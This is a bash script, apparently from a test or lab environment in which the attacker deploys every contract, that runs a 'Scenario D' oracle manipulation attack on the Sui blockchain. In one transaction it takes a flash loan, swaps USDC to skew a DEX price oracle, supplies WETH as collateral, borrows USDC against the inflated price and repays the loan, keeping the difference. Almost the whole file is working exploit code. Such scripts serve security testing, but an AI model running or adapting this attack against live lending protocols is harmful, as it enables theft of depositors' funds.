#!/bin/bash

# ============================================================================
# Scenario D: Oracle Manipulation Attack (CRITICAL)
# ============================================================================

set -e

# Load environment
source .env

# Setup Fresh Environment if needed
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                                                                  ║"
echo "║         🎯 SCENARIO D: Oracle Manipulation Attack 🎯             ║"
echo "║                                                                  ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

ATTACKER=$(sui client active-address)
USDC_TYPE="$PACKAGE_ID::usdc::USDC"
WETH_TYPE="$PACKAGE_ID::weth::WETH"

echo "📋 Environment Check:"
echo "   Package ID:       $PACKAGE_ID"
echo "   Flash Loan Pool:  $FLASH_LOAN_POOL_USDC"
echo "   Oracle Pool:      $ATTACK_DEX_POOL"
echo "   Lending Market:   $ATTACK_MARKET"
echo "   Attacker:         $ATTACKER"
echo ""

# ============================================================================
# STEP 2: Execute Oracle Manipulation Attack (Single PTB)
# ============================================================================

echo "🚀 Executing Oracle Manipulation Attack..."
echo "   1. Flash Loan 2,500,000 USDC"
echo "   2. Swap 2,000,000 USDC -> WETH on Oracle Pool (Manipulate Price)"
echo "   3. Supply 10 WETH Collateral"
echo "   4. Borrow 3,000,000 USDC (using manipulated oracle)"
echo "   5. Repay Flash Loan"
echo ""

# Amounts
FLASH_LOAN_AMOUNT=2500000000000  # 2,500,000 USDC (6 decimals)
SWAP_AMOUNT=2000000000000        # 2,000,000 USDC
SUPPLY_AMOUNT=1000000000         # 10 WETH (8 decimals)
BORROW_AMOUNT=2400000000000      # 2,400,000 USDC (Reduced to fit LTV)
REPAY_AMOUNT=2502250000000       # 2,500,000 + 0.09% fee = 2,502,250 USDC

sui client ptb \
    --assign flash_loan_amount $FLASH_LOAN_AMOUNT \
    --assign swap_amount $SWAP_AMOUNT \
    --assign supply_amount $SUPPLY_AMOUNT \
    --assign borrow_amount $BORROW_AMOUNT \
    --assign repay_amount $REPAY_AMOUNT \
    \
    --move-call "$PACKAGE_ID::flash_loan_pool::borrow_flash_loan<$USDC_TYPE>" \
        @"$FLASH_LOAN_POOL_USDC" flash_loan_amount \
    --assign loan_res \
    --assign loan_coin loan_res.0 \
    --assign receipt loan_res.1 \
    \
    --split-coins loan_coin "[swap_amount]" \
    --assign swap_coin \
    \
    --move-call "$PACKAGE_ID::simple_dex::swap_b_to_a<$WETH_TYPE,$USDC_TYPE>" \
        @"$ATTACK_DEX_POOL" swap_coin 0 \
    --assign weth_out \
    \
    --move-call "$PACKAGE_ID::compound_market::supply<$WETH_TYPE>" \
        @"$MARKET_WETH" weth_out @0x6 \
    --assign position \
    \
    --move-call "$PACKAGE_ID::compound_market::borrow<$WETH_TYPE,$USDC_TYPE>" \
        @"$MARKET_WETH" @"$ATTACK_MARKET" position @"$ATTACK_DEX_POOL" borrow_amount @0x6 \
    --assign borrowed_usdc \
    \
    --merge-coins loan_coin "[borrowed_usdc]" \
    \
    --split-coins loan_coin "[repay_amount]" \
    --assign repay_coin \
    \
    --move-call "$PACKAGE_ID::flash_loan_pool::repay_flash_loan<$USDC_TYPE>" \
        @"$FLASH_LOAN_POOL_USDC" repay_coin receipt \
    \
    --transfer-objects "[position, loan_coin]" @$ATTACKER \
    --gas-budget 100000000 --json

echo ""
echo "✅ Oracle Manipulation Attack Executed Successfully!"
echo ""
